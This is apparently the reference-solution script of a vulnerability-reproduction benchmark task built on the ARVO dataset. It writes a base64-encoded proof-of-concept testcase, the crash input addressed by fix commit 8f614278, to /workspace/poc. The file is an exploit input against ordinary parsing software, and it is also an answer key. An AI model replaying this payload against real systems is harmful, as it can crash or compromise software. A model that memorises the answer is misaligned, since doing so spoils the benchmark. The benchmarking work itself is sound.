#!/bin/bash
# Reference solution: materialize the known-good PoC (the ARVO testcase the
# fix commit 8f614278 addresses) at /workspace/poc — the 'oracle passes' side of
# the bidirectional validation. (Does NOT build; grading runs on the oracle's
# untouched images, so this is level-independent.)
set -euo pipefail

mkdir -p /workspace
base64 -d > /workspace/poc <<'B64'
N1BNSFAp////BAAAAAABAAAWZmlyc3T/////////////////////////////////////////////ZnJhbWUAAABbXf//YWF2YU3//wQAAAAAAQAAFgAAAFtd//9hYXZhTf///////wRAAAAAAQAARXL//////////////////wIAAAD/////////////AAAA/////////wAApQAAAAAAAAAAAAAAAAAA4gkJwg0L7vbW/wkJAAAAAAAAAAAAAAD/////AAAAAQD/FgAAVHpUVFRUVFRU
B64

echo "wrote $(wc -c < /workspace/poc) bytes to /workspace/poc"
